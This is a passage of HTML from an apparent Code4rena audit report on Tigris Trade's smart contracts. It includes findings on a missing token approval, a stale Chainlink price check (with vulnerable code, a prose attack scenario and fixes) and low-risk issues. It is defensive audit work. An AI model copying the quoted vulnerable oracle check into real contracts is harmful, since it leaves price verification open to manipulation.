});</span></span></span></code></pre>\n<h3 id=\"tools-used-14\" style=\"position:relative;\"><a href=\"#tools-used-14\" aria-label=\"tools used 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749</a> can be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gov</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1374442558\">TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>That will happen only with the first opened position until <code>_handleCloseFees()</code> is called.</p>\n<p>Valid but I think it should be low risk as it will mostly not affect anyone. </p>\n<p>Also the funds that are not distributed will be distributed later because of  <code>gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));</code> so no funds will be lost.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1385513708\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a lack of approvals, the rewards earned until the first call to <code>_handleCloseFees</code></p>\n<p>We also know that <code>_handleDeposit</code> will burn the balance of <code>tigAsset</code> that is unused.</p>\n<p>The risk however, is limited to the first (one or) few users, for this reason I believe that Medium Severity is more appropriate.</p>\n<p>Adding an approval on deployment or before calling <code>distribute</code> should help mitigate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/649#issuecomment-1407815329\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177034\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177034</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-24-chainlink-price-feed-is-not-sufficiently-validated-and-can-return-stale-price\" style=\"position:relative;\"><a href=\"#m-24-chainlink-price-feed-is-not-sufficiently-validated-and-can-return-stale-price\" aria-label=\"m 24 chainlink price feed is not sufficiently validated and can return stale price permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/655\">[M-24] Chainlink price feed is not sufficiently validated and can return stale price</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/655\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/654\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/647\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/624\">kwhuo68</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/466\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/448\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/430\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/405\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/349\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/284\">yixxas</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/278\">koxuan</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/225\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/199\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/187\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/178\">0xDecorativePineapple</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/165\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/121\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/22\">gzeon</a></em></p>\n<p>As mentioned by <a href=\"https://docs.tigris.trade/protocol/oracle\">https://docs.tigris.trade/protocol/oracle</a>, “Prices provided by the oracle network are also compared to Chainlink’s public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted.” The Chainlink price verification logic in the following <code>TradingLibrary.verifyPrice</code> function serves this purpose. However, besides that <code>IPrice(_chainlinkFeed).latestAnswer()</code> uses Chainlink’s deprecated <code>latestAnswer</code> function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When <code>assetChainlinkPriceInt != 0</code> is <code>true</code>, it is still possible that <code>assetChainlinkPriceInt</code> is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">verifyPrice</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_validSignatureTimer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_chainlinkEnabled</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> =&gt; </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isNode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_chainlinkEnabled</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetChainlinkPriceInt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">).</span><span class=\"mtk11\">latestAnswer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">assetChainlinkPriceInt</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetChainlinkPriceInt</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">IPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">+</span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">/</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">-</span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">/</span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!chainlinkPrice&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Based on <a href=\"https://docs.chain.link/docs/historical-price-data\">https://docs.chain.link/docs/historical-price-data</a>, the following can be done to avoid using a stale price returned by the Chainlink price feed.</p>\n<ol>\n<li>The <code>latestRoundData</code> function can be used instead of the deprecated <code>latestAnswer</code> function.</li>\n<li><code>roundId</code> and <code>answeredInRound</code> are also returned. “You can check <code>answeredInRound</code> against the current <code>roundId</code>. If <code>answeredInRound</code> is less than <code>roundId</code>, the answer is being carried over. If <code>answeredInRound</code> is equal to <code>roundId</code>, then the answer is fresh.”</li>\n<li>“A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.”</li>\n</ol>\n<h3 id=\"proof-of-concept-34\" style=\"position:relative;\"><a href=\"#proof-of-concept-34\" aria-label=\"proof of concept 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following steps can occur for the described scenario.</p>\n<ol>\n<li>Alice calls the <code>Trading.initiateMarketOrder</code> function, which eventually calls the <code>TradingLibrary.verifyPrice</code> function, to initiate a market order.</li>\n<li>When the <code>TradingLibrary.verifyPrice</code> function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset.</li>\n<li>The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price.</li>\n<li>Alice’s <code>Trading.initiateMarketOrder</code> transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.</li>\n</ol>\n<h3 id=\"tools-used-15\" style=\"position:relative;\"><a href=\"#tools-used-15\" aria-label=\"tools used 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113</a> can be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">uint80</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roundId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetChainlinkPriceInt</span><span class=\"mtk1\">, , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">updatedAt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint80</span><span class=\"mtk1\"> </span><span class=\"mtk12\">answeredInRound</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">).</span><span class=\"mtk11\">latestRoundData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">answeredInRound</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">roundId</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;price is stale&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">updatedAt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;round is incomplete&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1377551479\">GainsGoblin (Tigris Trade) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We don’t want a trader’s trade to revert just because the chainlink feed is a round behind.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1383083924\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has pointed out to a possible risk related to the price oracle returning stale data.</p>\n<p>Alternatively to checking for latest round, a check for <code>updatedAt</code> to not be too far in the past should also help mitigate the risk of offering an incorrect price which can lead to value extraction or unintended behaviour.</p>\n<p>Because of the risk, I do agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/655#issuecomment-1407824582\">GainsGoblin (Tigris Trade) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177187\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177187</a> </p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 12 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/657\">report highlighted below</a> by <strong>brgltd</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/662\">Deivitto</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/658\">rbserver</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/572\">0xNazgul</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/543\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/535\">joestakey</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/517\">hansfriese</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/445\">unforgiven</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/366\">IllIllI</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/268\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/125\">0x4non</a>, and\n<a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/96\">chrisdior4</a>\n.</em></p>\n<h2 id=\"01-use-call-instead-of-transfer-to-send-ether\" style=\"position:relative;\"><a href=\"#01-use-call-instead-of-transfer-to-send-ether\" aria-label=\"01 use call instead of transfer to send ether permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] Use <code>.call</code> instead of <code>.transfer</code> to send ether</h2>\n<p><code>.transfer</code> will relay 2300 gas and <code>.call</code> will relay all the gas. If the receive/fallback function from the recipient proxy contract has complex logic, using <code>.transfer</code> will fail, causing integration issues.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L588\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L588</a></p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Replace <code>.transfer</code> with <code>.call</code>. Note that the result of <code>.call</code> need to be checked. </p>\n<h2 id=\"02-unbounded-loop\" style=\"position:relative;\"><a href=\"#02-unbounded-loop\" aria-label=\"02 unbounded loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] Unbounded loop</h2>\n<p>New assets are pushed into the state variable <code>assets</code> array, at the function <code>BondNFT.addAsset()</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L352\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L352</a></p>\n<p><code>Lock.claimGovFees()</code> will iterate all the assets.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L110-L120\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L110-L120</a></p>\n<p>Currently, <code>assets</code> can grow indefinitely. E.g. there’s no maximum limit and there’s no functionality to remove assets.</p>\n<p>If the array grows too large, calling <code>Lack.claimGovFeeds()</code> might run out of gas and revert. Claiming and distributing rewards will result in a DOS condition.</p>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 